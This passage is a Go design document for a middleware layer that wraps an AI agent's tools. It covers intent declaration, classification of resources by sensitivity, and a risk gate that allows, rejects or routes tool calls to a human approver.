# DESIGN: Safe Tool Calling (Rich Tools)

**Status:** Draft v7  
**Date:** 2026-04-29  
**Author:** brainstorm session  
**History:** v1–v4 iterative design, v5 final fixes, v6 consolidated, v7 expanded scope

### Revision Notes

- **v5 fixes (final):**
  - `Approver` type moved to `tool` package as `func(ctx Ctx, intent Intent, detail any) (bool, error)` — the `any` parameter carries `toolmw.Assessment` without creating an import cycle between `tool` and `toolmw`. TUI approvers type-assert to get dimensions/rationale for display; simple approvers (CI deny-all, allowlist) ignore it.
  - `RiskGate.resolveApprover` returns `tool.Approver` (not a nonexistent `toolmw.Approver` type).
  - CI/headless examples use `func(_ tool.Ctx, _ tool.Intent, _ any)` signatures — no reference to `toolmw.Assessment` in the function signature.
  - All cross-references verified: no import cycles, no undefined types.
- **v6:** Consolidated revision notes. Decided trade-offs table finalized.
- **v7:** Renamed to "Safe Tool Calling". Added competitive analysis (Codex CLI, Claude Code). Added Part 9 (secret protection, env security — ported from `~/projects/fleet`), Part 10 (bubblewrap sandbox integration). Expanded to 8 implementation phases. Added approval persistence with revocation (Phase 6).
- **Supersedes:** Original task to increase default tool timeout from 30s→5m and show timeout duration in messages (files: `terminal/cli/cobra.go`, `agent/agent.go`, `runner/executor.go`, `runner/runner_test.go`) was abandoned in favor of this middleware-based approach.

---

## Problem Statement

Tools today are flat: `Name, Description, Schema, Execute(ctx, params) → (Result, error)`. There is no composable way to:

1. **Extend schema** — e.g. add a `timeout` field to any tool so the LLM can request a custom duration.
2. **Intercept execution** — e.g. analyze a tool call for risk before running it, gate on user approval.
3. **Observe lifecycle** — e.g. log/metric every tool call, measure latency, record inputs/outputs for debugging.
4. **Transform inputs/outputs** — e.g. redact secrets from results, inject default parameters, normalize paths.
5. **Short-circuit** — e.g. deny a dangerous operation without ever calling the inner tool.
6. **Modify metadata** — e.g. change name, description, or guidance for a wrapped tool.

We want a **ToolMiddleware** pattern that composes around any `tool.Tool` and can hook into well-defined injection points.

---

## Design Goals

- **Composable**: Multiple middlewares stack. Order matters and is explicit.
- **Transparent**: A wrapped tool still satisfies `tool.Tool`. The runner doesn't know or care.
- **Schema-aware**: Middlewares can extend the tool's JSON schema (add properties) and strip their own fields before forwarding to the inner tool.
- **Metadata-mutable**: Middlewares can override Name, Description, and Guidance.
- **Fail-fast capable**: A middleware can reject a call (return error/result) without invoking the inner tool.
- **Introspectable**: Middleware layers can be unwrapped for debugging, testing, and registry operations.
- **Zero-cost when absent**: If no middleware is applied, the tool executes exactly as today.

---

## Part 1: Generic Middleware Layer

### Core Abstraction

```go
package tool

// Middleware wraps a Tool, intercepting its lifecycle at defined hook points.
type Middleware interface {
    // Wrap takes an inner Tool and returns a new Tool that decorates it.
    Wrap(inner Tool) Tool
}

// MiddlewareFunc is a convenience adapter.
type MiddlewareFunc func(inner Tool) Tool

func (f MiddlewareFunc) Wrap(inner Tool) Tool { return f(inner) }

// Apply wraps a tool with one or more middlewares.
// Apply(tool, m1, m2, m3) → m3(m2(m1(tool)))
// First applied = innermost. Last applied = outermost (runs first on call).
func Apply(t Tool, middlewares ...Middleware) Tool {
    for _, m := range middlewares {
        t = m.Wrap(t)
    }
    return t
}

// Unwrap returns the immediate inner tool if t is a wrapped tool.
// Returns nil if t is not wrapped.
func Unwrap(t Tool) Tool {
    if w, ok := t.(interface{ Unwrap() Tool }); ok {
        return w.Unwrap()
    }
    return nil
}

// Innermost returns the deepest unwrapped tool by repeatedly calling Unwrap.
func Innermost(t Tool) Tool {
    for {
        inner := Unwrap(t)
        if inner == nil {
            return t
        }
        t = inner
    }
}
```

### Per-Call State

Hooks within a single middleware often need to pass data between phases (e.g. timeout middleware parses a duration in OnInput, applies it in OnContext, reports it in OnResult). Context values work but are clumsy for this. Instead, each hook call receives a per-call `State` map:

```go
// CallState is per-call mutable state shared across hook phases within
// one middleware. Each middleware gets its own CallState per Execute call.
// It is NOT shared across stacked middlewares.
type CallState map[string]any
```

### Hook Interface

```go
// Hooks defines the injection points a middleware can implement.
// All methods have no-op defaults via HooksBase.
//
// Hook methods receive the inner Tool for introspection (e.g. type-asserting
// to IntentProvider). They must not call inner.Execute — that is handled
// by the wrapper.
type Hooks interface {
    // ── Metadata (called once at wrap time, cached) ──

    // OnName returns a replacement name, or "" to keep the inner tool's name.
    OnName(inner Tool) string

    // OnDescription returns a replacement description, or "" to keep inner's.
    OnDescription(inner Tool) string

    // OnGuidance returns replacement guidance, or "" to keep inner's.
    // To append rather than replace, concatenate with inner.Guidance() yourself.
    OnGuidance(inner Tool) string

    // OnSchema receives the inner tool's schema and returns an extended schema.
    // Return nil to keep the inner schema unchanged.
    // The returned schema is cached — OnSchema is called once per Wrap.
    OnSchema(inner Tool) *jsonschema.Schema

    // ── Per-call hooks (called on every Execute) ──

    // OnInput is called with the raw JSON arguments from the LLM.
    // It may:
    //   - Return (modified_input, nil, nil) to transform and continue.
    //   - Return (_, result, nil) to short-circuit with a result (skip Execute).
    //   - Return (_, nil, err) to short-circuit with an error (skip Execute).
    //   - Return (input, nil, nil) to pass through unchanged.
    //
    // Use state to pass parsed values to later hooks (OnContext, OnResult).
    OnInput(ctx Ctx, inner Tool, input json.RawMessage, state CallState) (json.RawMessage, Result, error)

    // OnContext is called after OnInput succeeds (no short-circuit).
    // Returns a (possibly modified) Ctx and a cleanup function.
    // The cleanup is deferred immediately — it runs after Execute + OnResult.
    OnContext(ctx Ctx, state CallState) (Ctx, func())

    // OnIntent is called after intent extraction, before risk assessment
    // or any other intent consumer. It may amend, enrich, or replace the
    // intent. For example:
    //   - A locality-aware middleware can upgrade Locality from "unknown"
    //     to "sensitive" based on deployment context.
    //   - A middleware that writes audit logs can append its own operations
    //     (e.g. write to audit file).
    //   - A middleware can downgrade Confidence if it detects uncertainty.
    //
    // Return the (possibly modified) intent. Return the input intent
    // unchanged to pass through.
    OnIntent(ctx Ctx, inner Tool, intent Intent, state CallState) Intent

    // OnResult is called after the inner tool returns (or after context
    // expiry). It may inspect, log, transform, or replace the result/error.
    OnResult(ctx Ctx, inner Tool, input json.RawMessage, result Result, err error, state CallState) (Result, error)
}

// HooksBase provides no-op defaults for all hooks.
// Embed this in concrete middleware structs.
type HooksBase struct{}

func (HooksBase) OnName(Tool) string                  { return "" }
func (HooksBase) OnDescription(Tool) string            { return "" }
func (HooksBase) OnGuidance(Tool) string               { return "" }
func (HooksBase) OnSchema(Tool) *jsonschema.Schema     { return nil }
func (HooksBase) OnInput(_ Ctx, _ Tool, input json.RawMessage, _ CallState) (json.RawMessage, Result, error) {
    return input, nil, nil
}
func (HooksBase) OnContext(ctx Ctx, _ CallState) (Ctx, func()) { return ctx, nil }
func (HooksBase) OnIntent(_ Ctx, _ Tool, intent Intent, _ CallState) Intent { return intent }
func (HooksBase) OnResult(_ Ctx, _ Tool, _ json.RawMessage, res Result, err error, _ CallState) (Result, error) {
    return res, err
}
```

### hookedTool — The Standard Wrapper

```go
func HooksMiddleware(hooks Hooks) Middleware {
    return MiddlewareFunc(func(inner Tool) Tool {
        t := &hookedTool{inner: inner, hooks: hooks}
        // Cache metadata at wrap time — these don't change per call.
        t.name = hooks.OnName(inner)
        t.desc = hooks.OnDescription(inner)
        t.guid = hooks.OnGuidance(inner)
        t.schema = hooks.OnSchema(inner)
        return t
    })
}

type hookedTool struct {
    inner  Tool
    hooks  Hooks
    name   string             // cached; "" means use inner
    desc   string             // cached; "" means use inner
    guid   string             // cached; "" means use inner
    schema *jsonschema.Schema // cached; nil means use inner
}

// Unwrap exposes the inner tool for introspection.
func (t *hookedTool) Unwrap() Tool { return t.inner }

func (t *hookedTool) Name() string {
    if t.name != "" { return t.name }
    return t.inner.Name()
}

func (t *hookedTool) Description() string {
    if t.desc != "" { return t.desc }
    return t.inner.Description()
}

func (t *hookedTool) Guidance() string {
    if t.guid != "" { return t.guid }
    return t.inner.Guidance()
}

func (t *hookedTool) Schema() *jsonschema.Schema {
    if t.schema != nil { return t.schema }
    return t.inner.Schema()
}

// onIntent delegates to the hooks' OnIntent. Called by ExtractIntent
// as it walks the middleware chain inside-out.
func (t *hookedTool) onIntent(ctx Ctx, intent Intent, state CallState) Intent {
    return t.hooks.OnIntent(ctx, t.inner, intent, state)
}

func (t *hookedTool) Execute(ctx Ctx, input json.RawMessage) (Result, error) {
    state := make(CallState)

    // 1. OnInput — may transform or short-circuit
    transformed, earlyResult, err := t.hooks.OnInput(ctx, t.inner, input, state)
    if err != nil {
        return nil, err
    }
    if earlyResult != nil {
        return earlyResult, nil
    }

    // 2. OnContext — may modify context (deadline, values, etc.)
    ctx, cleanup := t.hooks.OnContext(ctx, state)
    if cleanup != nil {
        defer cleanup()
    }

    // 3. Execute inner tool
    result, execErr := t.inner.Execute(ctx, transformed)

    // 4. OnResult — may transform/replace
    return t.hooks.OnResult(ctx, t.inner, transformed, result, execErr, state)
}
```

### Error vs Result Short-Circuit Semantics

`OnInput` can short-circuit in two ways. The distinction matters:

| Return | Meaning | What the LLM sees |
|--------|---------|-------------------|
| `(_, nil, err)` | Infrastructure failure — the middleware itself broke. | Error propagated up. Runner may retry or abort. |
| `(_, result, nil)` | Deliberate gate — the middleware decided to block/deny. | The result (e.g. "denied: destructive command") is returned as a normal tool result with `IsError: true`. The LLM sees the denial reason and can adjust. |

**Rule of thumb**: Use `result` for policy decisions the LLM should see. Use `error` for bugs and infrastructure failures.

---

## Part 2: Tool Intent — Abstract Resource+Operation Model

### The Insight from cmdrisk

cmdrisk works by extracting **structured semantics** from bash commands:

1. **Parse** the shell AST (pipes, redirects, substitutions, quoting)
2. **Resolve** token roles by structural position (executable, argument, redirect target, etc.)
3. **Extract targets** with categories (file, directory, URL, host, device, service) and roles (read_target, write_target, delete_target, execution_source, network_target, persistence_target)
4. **Classify behaviors** (filesystem_read, filesystem_write, filesystem_delete, network_fetch, remote_execution, dynamic_execution, persistence_modify, raw_device_write)
5. **Score risk** across dimensions (destructiveness, scope, reversibility, privilege_sensitivity, remote_exposure, data_sensitivity, persistence, operational_risk, uncertainty)
6. **Decide** (allow, requires_approval, reject, error)

This is brilliant for bash — but bash is special because it's an opaque string that hides arbitrary semantics. The parser has to reverse-engineer intent from syntax.

**For structured tool calls, we already have the schema.** The tool *knows* what it's about to do. We don't need to reverse-engineer — we need the tool to **declare** its intent.

### Tool Intent: Resources + Operations

Every tool call, at its core, operates on **resources** with **operations**:

| Tool | Resource(s) | Operation |
|------|------------|-----------|
| `bash` | *(opaque — delegate to cmdrisk)* | *(opaque)* |
| `file_read` | `file:/home/user/secrets.env` | `read` |
| `file_write` | `file:/home/user/.bashrc` | `write` |
| `file_delete` | `file:/home/user/important.db` | `delete` |
| `file_edit` | `file:src/main.go` | `write` |
| `web_fetch` GET | `url:https://api.example.com/data` | `network_read` |
| `web_fetch` POST | `url:https://api.example.com/submit` | `network_write` |
| `web_search` | `service:tavily` | `network_read` |
| `git_diff` | `repo:.` | `read` |
| `glob` | `dir:.` | `read` |
| `grep` | `file:src/**/*.go` | `read` |
| `vision` | `url:https://...`, `file:screenshot.png` | `read` |

### The Intent Types

```go
package tool

// Intent describes what a tool call is about to do, expressed as
// operations on resources. This is the abstract layer that risk
// assessment, approval gates, and audit systems consume.
//
// Intent has two layers:
//   - ToolClass: static, known at registration time, independent of params.
//     Just calling the tool is itself a signal (e.g. bash = command_execution,
//     file_delete = filesystem_delete, web_fetch = network access).
//   - Operations: dynamic, derived from the actual params of this call.
//     These are the specific resources and actions.
type Intent struct {
    // Tool is the tool name.
    Tool string `json:"tool"`

    // ToolClass is the static intent category of the tool itself,
    // independent of parameters. Known at registration time.
    // Examples:
    //   "command_execution"   — bash, shell tools
    //   "filesystem_read"     — file_read, grep, glob
    //   "filesystem_write"    — file_write, file_edit
    //   "filesystem_delete"   — file_delete
    //   "network_access"      — web_fetch, web_search
    //   "repository_access"   — git_status, git_diff
    //   "vision"              — vision tool
    //   "agent_control"       — skill, tools_activate, tools_deactivate
    //
    // A risk assessor can gate on ToolClass alone — e.g. block all
    // command_execution tools in a restricted environment, regardless
    // of what specific command is being run.
    ToolClass string `json:"tool_class"`

    // Operations is the set of resource+operation pairs this specific
    // call will perform. Derived from the actual params at call time.
    Operations []IntentOperation `json:"operations,omitempty"`

    // Behaviors are high-level semantic labels.
    // Uses the same vocabulary as cmdrisk: filesystem_read, filesystem_write,
    // filesystem_delete, network_fetch, network_write, remote_execution,
    // dynamic_execution, persistence_modify, raw_device_write, command_execution.
    Behaviors []string `json:"behaviors,omitempty"`

    // Confidence indicates how certain the intent extraction is.
    //   "high"     — fully determined from typed params (structured tools)
    //   "moderate" — mostly determined, some inference (cmdrisk with known commands)
    //   "low"      — heuristic or opaque (unknown commands, tools without IntentProvider)
    Confidence string `json:"confidence"`

    // Opaque is true when the tool's semantics could not be determined.
    // Risk assessors should treat opaque intents conservatively.
    Opaque bool `json:"opaque,omitempty"`
}

// IntentOperation is a single resource+operation pair.
type IntentOperation struct {
    // Resource identifies what is being acted upon.
    Resource IntentResource `json:"resource"`

    // Operation is the action being performed.
    // Vocabulary (aligned with cmdrisk target roles):
    //   read, write, delete, execute, network_read, network_write,
    //   persistence_modify, device_write
    Operation string `json:"operation"`

    // Certain indicates whether this operation is definitely happening
    // (true) or inferred/conditional (false).
    Certain bool `json:"certain"`
}

// IntentResource identifies a resource being acted upon.
type IntentResource struct {
    // Category classifies the resource type.
    // Vocabulary (aligned with cmdrisk target categories):
    //   file, directory, url, host, service, device, process, repo,
    //   config, secret, environment_variable
    Category string `json:"category"`

    // Value is the concrete identifier: path, URL, hostname, etc.
    Value string `json:"value"`

    // Locality classifies the resource's sensitivity zone.
    // Vocabulary (aligned with cmdrisk):
    //   workspace  — inside the agent's working directory
    //   sensitive  — matches sensitive path prefixes
    //   secret     — matches secret path prefixes (keys, tokens, creds)
    //   system     — system paths (/etc, /usr, /var, etc.)
    //   network    — remote/external resources
    //   unknown    — could not be classified
    Locality string `json:"locality"`
}
```

### IntentProvider — Tools Declare Their Intent

```go
// IntentProvider is an optional interface a Tool can implement to declare
// what it's about to do before execution. This enables risk assessment,
// approval gates, and audit without reverse-engineering tool semantics.
//
// Tools that don't implement IntentProvider are treated as opaque
// (Intent.Opaque = true, Confidence = "low").
type IntentProvider interface {
    // DeclareIntent inspects the raw input and returns the intent.
    // Called before Execute, with the same raw JSON.
    //
    // DeclareIntent must be side-effect-free and fast. It must not
    // perform the actual operation — only describe what would happen.
    DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error)
}
```

### Extracting Intent — Helper

```go
// ExtractIntent gets the intent from a tool, then walks the middleware
// chain outward letting each layer amend it via OnIntent.
//
// Flow:
//   1. Find the innermost IntentProvider via Unwrap chain.
//   2. Call DeclareIntent to get the base intent.
//   3. Walk the wrapper chain from inside out, calling OnIntent on each
//      hookedTool layer so middlewares can enrich/amend the intent.
//
// This means the inner tool declares "I will read file X", and an outer
// middleware can add "...and I will write an audit log to Y".
func ExtractIntent(t Tool, ctx Ctx, input json.RawMessage) Intent {
    // 1. Get base intent from innermost IntentProvider.
    target := Innermost(t)
    var intent Intent
    if provider, ok := target.(IntentProvider); ok {
        var err error
        intent, err = provider.DeclareIntent(ctx, input)
        if err != nil {
            intent = Intent{Tool: t.Name(), ToolClass: "unknown", Opaque: true, Confidence: "low"}
        }
    } else {
        intent = Intent{Tool: t.Name(), ToolClass: "unknown", Opaque: true, Confidence: "low"}
    }

    // 2. Collect middleware layers (outermost-first via Unwrap walk).
    var layers []*hookedTool
    cur := t
    for {
        if ht, ok := cur.(*hookedTool); ok {
            layers = append(layers, ht)
            cur = ht.inner
        } else {
            break
        }
    }
    // Reverse to inside-out order: innermost middleware amends first,
    // outermost gets the final say.
    for i, j := 0, len(layers)-1; i < j; i, j = i+1, j-1 {
        layers[i], layers[j] = layers[j], layers[i]
    }

    // 3. Let each middleware layer amend the intent.
    for _, ht := range layers {
        intent = ht.onIntent(ctx, intent, nil)
    }

    return intent
}
```

### How Each Tool Declares Intent

**file_read:**
```go
func (t *fileReadTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p FileReadParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }
    ops := make([]IntentOperation, 0, len(p.Path))
    for _, path := range p.Path {
        ops = append(ops, IntentOperation{
            Resource:  IntentResource{Category: "file", Value: path, Locality: classifyLocality(ctx, path)},
            Operation: "read",
            Certain:   true,
        })
    }
    return Intent{
        Tool:       "file_read",
        Operations: ops,
        Behaviors:  []string{"filesystem_read"},
        Confidence: "high",
    }, nil
}
```

**file_write:**
```go
func (t *fileWriteTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p FileWriteParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }
    return Intent{
        Tool: "file_write",
        Operations: []IntentOperation{{
            Resource:  IntentResource{Category: "file", Value: p.Path, Locality: classifyLocality(ctx, p.Path)},
            Operation: "write",
            Certain:   true,
        }},
        Behaviors:  []string{"filesystem_write"},
        Confidence: "high",
    }, nil
}
```

**file_delete:**
```go
func (t *fileDeleteTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p FileDeleteParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }
    return Intent{
        Tool: "file_delete",
        Operations: []IntentOperation{{
            Resource:  IntentResource{Category: "file", Value: p.Path, Locality: classifyLocality(ctx, p.Path)},
            Operation: "delete",
            Certain:   true,
        }},
        Behaviors:  []string{"filesystem_delete"},
        Confidence: "high",
    }, nil
}
```

**file_edit** (multi-path):
```go
func (t *fileEditTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p FileEditParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }
    ops := make([]IntentOperation, 0, len(p.Path))
    for _, path := range p.Path {
        ops = append(ops, IntentOperation{
            Resource:  IntentResource{Category: "file", Value: path, Locality: classifyLocality(ctx, path)},
            Operation: "write",
            Certain:   true,
        })
    }
    return Intent{
        Tool:       "file_edit",
        Operations: ops,
        Behaviors:  []string{"filesystem_write"},
        Confidence: "high",
    }, nil
}
```

**web_fetch:**
```go
func (t *webFetchTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p WebFetchParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }
    u, _ := url.Parse(p.URL)
    method := strings.ToUpper(p.Method)
    if method == "" { method = "GET" }

    op := "network_read"
    behavior := "network_fetch"
    if method == "POST" || method == "PUT" || method == "PATCH" || method == "DELETE" {
        op = "network_write"
        behavior = "network_write"
    }

    locality := "network"
    if u != nil && isLocalhost(u.Hostname()) {
        locality = "workspace"
    }

    return Intent{
        Tool: "web_fetch",
        Operations: []IntentOperation{{
            Resource:  IntentResource{Category: "url", Value: p.URL, Locality: locality},
            Operation: op,
            Certain:   true,
        }},
        Behaviors:  []string{behavior},
        Confidence: "high",
    }, nil
}
```

**bash — the special case (cmdrisk bridge):**
```go
func (t *bashTool) DeclareIntent(ctx Ctx, input json.RawMessage) (Intent, error) {
    var p BashParams
    if err := json.Unmarshal(input, &p); err != nil {
        return Intent{}, err
    }

    // No cmdrisk analyzer configured — opaque.
    if t.riskAnalyzer == nil {
        return Intent{
            Tool:       "bash",
            Opaque:     true,
            Confidence: "low",
            Behaviors:  []string{"command_execution"},
        }, nil
    }

    // Delegate to cmdrisk for the heavy lifting.
    commands := strings.Join([]string(p.Cmd), "; ")
    assessment, err := t.riskAnalyzer.Assess(ctx, cmdrisk.Request{
        Command: commands,
        Context: riskContextFromToolCtx(ctx),
    })
    if err != nil {
        return Intent{Tool: "bash", Opaque: true, Confidence: "low"}, nil
    }

    // Map cmdrisk targets → IntentOperations
    ops := make([]IntentOperation, 0, len(assessment.Targets))
    for _, target := range assessment.Targets {
        ops = append(ops, IntentOperation{
            Resource:  IntentResource{Category: target.Category, Value: target.Value, Locality: target.Locality},
            Operation: target.Role,
            Certain:   target.Certain,
        })
    }
    return Intent{
        Tool:       "bash",
        Operations: ops,
        Behaviors:  assessment.Behaviors,
        Confidence: string(assessment.Confidence),
    }, nil
}
```

### Locality Classification

```go
// classifyLocality maps a resource path to a sensitivity zone.
// Uses the agent's workspace and configured path prefixes.
func classifyLocality(ctx Ctx, path string) string {
    abs := resolvePath(ctx.WorkDir(), path)
    switch {
    case isUnderWorkspace(ctx, abs):  return "workspace"
    case isSecretPath(ctx, abs):      return "secret"
    case isSensitivePath(ctx, abs):   return "sensitive"
    case isSystemPath(abs):           return "system"
    default:                          return "unknown"
    }
}

// LocalityConfig holds the path prefix configuration for locality
// classification. Mirrors cmdrisk's AssetContext.
type LocalityConfig struct {
    WorkspacePrefixes []string // paths considered "workspace" (safe)
    SensitivePrefixes []string // paths considered "sensitive"
    SecretPrefixes    []string // paths considered "secret" (keys, creds)
}
```

---

## Part 3: Risk Assessment Middleware

### Architecture

```
┌──────────────────────────────────────────────────────────────────┐
│                        RiskGate Middleware                        │
│                                                                  │
│  OnInput:                                                        │
│    1. ExtractIntent(inner, ctx, input)                           │
│       ├─ inner implements IntentProvider? → DeclareIntent()      │
│       └─ no? → Intent{Opaque: true, Confidence: "low"}          │
│    2. Assessor.Assess(ctx, intent) → Assessment                  │
│       ├─ bash? → CmdRiskAssessor (uses cmdrisk.Assessment       │
│       │          already computed in DeclareIntent)              │
│       └─ structured? → PolicyAssessor (scores from intent)      │
│    3. Gate on Assessment.Decision                                │
│       ├─ allow → pass through                                   │
│       ├─ requires_approval → Approver callback                  │
│       └─ reject → return denial result                          │
└──────────────────────────────────────────────────────────────────┘
```

### Avoiding Double Work for bash

cmdrisk is expensive (shell parsing, semantic resolution, risk scoring). We don't want to run it twice — once in `DeclareIntent` and again in the assessor.

Solution: **DeclareIntent for bash stores the full cmdrisk.Assessment in the Intent via an extension field.** The CmdRiskAssessor checks for it before re-analyzing.

```go
// Intent extension for carrying pre-computed assessment data.
type Intent struct {
    // ... existing fields ...

    // Extra carries tool-specific data that downstream consumers
    // (assessors, audit) can type-assert. Not serialized to JSON.
    Extra any `json:"-"`
}

// In bash's DeclareIntent:
return Intent{
    Tool:       "bash",
    ToolClass:  "command_execution",
    Operations: ops,
    Behaviors:  assessment.Behaviors,
    Confidence: string(assessment.Confidence),
    Extra:      assessment, // cmdrisk.Assessment — assessor can reuse
}, nil

// In CmdRiskAssessor.Assess:
func (a *CmdRiskAssessor) Assess(ctx tool.Ctx, intent tool.Intent) (Assessment, error) {
    // Reuse pre-computed assessment if available.
    if ca, ok := intent.Extra.(cmdrisk.Assessment); ok {
        return mapCmdRiskAssessment(ca), nil
    }
    // Fallback: re-analyze (shouldn't happen in normal flow).
    ...
}
```

### Risk Gate Implementation

```go
package toolmw

type RiskGate struct {
    tool.HooksBase
    Assessor IntentAssessor
    // Approver is optional here. If nil, the RiskGate looks for an
    // Approver in the tool.Ctx via tool.ApproverFrom(ctx).
    // This allows the app/runtime layer to inject the approver once,
    // rather than wiring it into every middleware instance.
    Approver tool.Approver
}

// IntentAssessor evaluates an Intent and returns a risk decision.
type IntentAssessor interface {
    Assess(ctx tool.Ctx, intent tool.Intent) (Assessment, error)
}

type Assessment struct {
    Decision    Decision    `json:"decision"`
    Dimensions  []Dimension `json:"dimensions,omitempty"`
    Confidence  string      `json:"confidence"`
    Explanation string      `json:"explanation,omitempty"`
}

type Decision struct {
    Action    Action   `json:"action"`
    Reasons   []string `json:"reasons,omitempty"`
    Rationale string   `json:"rationale,omitempty"`
}

type Action string
const (
    ActionAllow            Action = "allow"
    ActionRequiresApproval Action = "requires_approval"
    ActionReject           Action = "reject"
)

type Dimension struct {
    Name     string `json:"name"`
    Severity int    `json:"severity"`
    Reason   string `json:"reason,omitempty"`
}

// resolveApprover returns the approver to use: the middleware's own if set,
// otherwise the one from context, otherwise nil.
func (m *RiskGate) resolveApprover(ctx tool.Ctx) tool.Approver {
    if m.Approver != nil {
        return m.Approver
    }
    return tool.ApproverFrom(ctx)
}

func (m *RiskGate) OnInput(ctx tool.Ctx, inner tool.Tool, input json.RawMessage, state tool.CallState) (json.RawMessage, tool.Result, error) {
    // 1. Extract intent (uses IntentProvider if available)
    intent := tool.ExtractIntent(inner, ctx, input)
    state["intent"] = intent // available to OnResult for audit

    // 2. Assess risk
    assessment, err := m.Assessor.Assess(ctx, intent)
    if err != nil {
        // Assessment infrastructure failure — fail open or closed?
        // Default: fail closed (deny). Configurable.
        return nil, tool.Errorf("[risk gate] assessment error: %v", err), nil
    }
    state["assessment"] = assessment

    // 3. Gate
    switch assessment.Decision.Action {
    case ActionAllow:
        return input, nil, nil

    case ActionRequiresApproval:
        approver := m.resolveApprover(ctx)
        if approver == nil {
            // No approver configured anywhere — deny by default.
            return nil, tool.Errorf("[risk gate] approval required but no approver configured: %s",
                assessment.Decision.Rationale), nil
        }
        approved, err := approver(ctx, intent, assessment) // assessment is toolmw.Assessment, passed as any
        if err != nil {
            return nil, tool.Errorf("[risk gate] approval error: %v", err), nil
        }
        if !approved {
            return nil, tool.Errorf("[risk gate] denied by user: %s",
                assessment.Decision.Rationale), nil
        }
        return input, nil, nil

    case ActionReject:
        return nil, tool.Errorf("[risk gate] rejected: %s",
            assessment.Decision.Rationale), nil

    default:
        return input, nil, nil
    }
}

// OnResult can log the outcome for audit.
func (m *RiskGate) OnResult(ctx tool.Ctx, inner tool.Tool, input json.RawMessage, res tool.Result, err error, state tool.CallState) (tool.Result, error) {
    // Audit: log intent + assessment + outcome
    // (implementation depends on logging infrastructure)
    return res, err
}
```

### Assessor Implementations

**PolicyAssessor — generic, works for all structured tools:**

```go
type PolicyAssessor struct {
    Locality LocalityConfig
    // Thresholds for each operation type.
    // Operations on resources with higher locality sensitivity
    // produce higher risk scores.
}

func (a *PolicyAssessor) Assess(ctx tool.Ctx, intent tool.Intent) (Assessment, error) {
    if intent.Opaque {
        // Unknown tool, unknown intent — conservative.
        return Assessment{
            Decision:   Decision{Action: ActionRequiresApproval, Reasons: []string{"opaque_intent"}, Rationale: "tool intent could not be determined"},
            Confidence: "low",
        }, nil
    }

    maxSeverity := 0
    var reasons []string
    var dims []Dimension

    for _, op := range intent.Operations {
        severity := scoreSeverity(op.Operation, op.Resource.Locality)
        dim := Dimension{
            Name:     op.Operation + ":" + op.Resource.Category,
            Severity: severity,
            Reason:   fmt.Sprintf("%s %s (%s)", op.Operation, op.Resource.Value, op.Resource.Locality),
        }
        dims = append(dims, dim)
        if severity > maxSeverity {
            maxSeverity = severity
        }
        if severity >= 7 {
            reasons = append(reasons, dim.Reason)
        }
    }

    action := ActionAllow
    if maxSeverity >= 8 {
        action = ActionReject
    } else if maxSeverity >= 5 {
        action = ActionRequiresApproval
    }

    return Assessment{
        Decision:   Decision{Action: action, Reasons: reasons, Rationale: summarize(dims)},
        Dimensions: dims,
        Confidence: intent.Confidence,
    }, nil
}

// scoreSeverity returns 0-10 based on operation × locality.
func scoreSeverity(operation, locality string) int {
    opWeight := map[string]int{
        "read": 1, "network_read": 2, "write": 4, "network_write": 5,
        "delete": 6, "execute": 5, "persistence_modify": 7, "device_write": 8,
    }
    localityWeight := map[string]int{
        "workspace": 0, "unknown": 1, "network": 2,
        "system": 3, "sensitive": 4, "secret": 5,
    }
    base := opWeight[operation]   // 0 if unknown
    loc := localityWeight[locality] // 0 if unknown
    score := base + loc
    if score > 10 { score = 10 }
    return score
}
```

**CmdRiskAssessor — bridges cmdrisk for bash:**

```go
type CmdRiskAssessor struct {
    Analyzer *cmdrisk.Analyzer
}

func (a *CmdRiskAssessor) Assess(ctx tool.Ctx, intent tool.Intent) (Assessment, error) {
    // Reuse pre-computed cmdrisk assessment if available.
    if ca, ok := intent.Extra.(cmdrisk.Assessment); ok {
        return mapCmdRiskAssessment(ca), nil
    }
    // Not a bash tool or no pre-computed assessment — delegate to PolicyAssessor.
    return Assessment{
        Decision: Decision{Action: ActionAllow},
        Confidence: intent.Confidence,
    }, nil
}

func mapCmdRiskAssessment(ca cmdrisk.Assessment) Assessment {
    action := ActionAllow
    switch ca.Decision.Action {
    case cmdrisk.ActionRequiresApproval:
        action = ActionRequiresApproval
    case cmdrisk.ActionReject:
        action = ActionReject
    }
    dims := make([]Dimension, 0, len(ca.RiskDimensions))
    for _, d := range ca.RiskDimensions {
        dims = append(dims, Dimension{Name: d.Name, Severity: d.Severity, Reason: d.Reason})
    }
    return Assessment{
        Decision:    Decision{Action: action, Reasons: ca.Decision.Reasons, Rationale: ca.Decision.Rationale},
        Dimensions:  dims,
        Confidence:  string(ca.Confidence),
        Explanation: ca.Explanation.Summary,
    }
}
```

**CompositeAssessor — combines both:**

```go
// CompositeAssessor routes to the appropriate assessor based on intent.
type CompositeAssessor struct {
    CmdRisk *CmdRiskAssessor  // for bash (when Extra carries cmdrisk.Assessment)
    Policy  *PolicyAssessor   // for everything else
}

func (a *CompositeAssessor) Assess(ctx tool.Ctx, intent tool.Intent) (Assessment, error) {
    // If intent carries a cmdrisk assessment, use the cmdrisk assessor.
    if _, ok := intent.Extra.(cmdrisk.Assessment); ok && a.CmdRisk != nil {
        return a.CmdRisk.Assess(ctx, intent)
    }
    // Otherwise use the generic policy assessor.
    if a.Policy != nil {
        return a.Policy.Assess(ctx, intent)
    }
    return Assessment{Decision: Decision{Action: ActionAllow}}, nil
}
```

---


### OnIntent Example: Locality Enrichment Middleware

A middleware that knows about the deployment environment can enrich locality
classification for all tools beneath it:

```go
type LocalityEnricher struct {
    tool.HooksBase
    Config LocalityConfig
}

func (m *LocalityEnricher) OnIntent(_ tool.Ctx, _ tool.Tool, intent tool.Intent, _ tool.CallState) tool.Intent {
    for i := range intent.Operations {
        op := &intent.Operations[i]
        if op.Resource.Locality == "unknown" {
            op.Resource.Locality = m.classify(op.Resource)
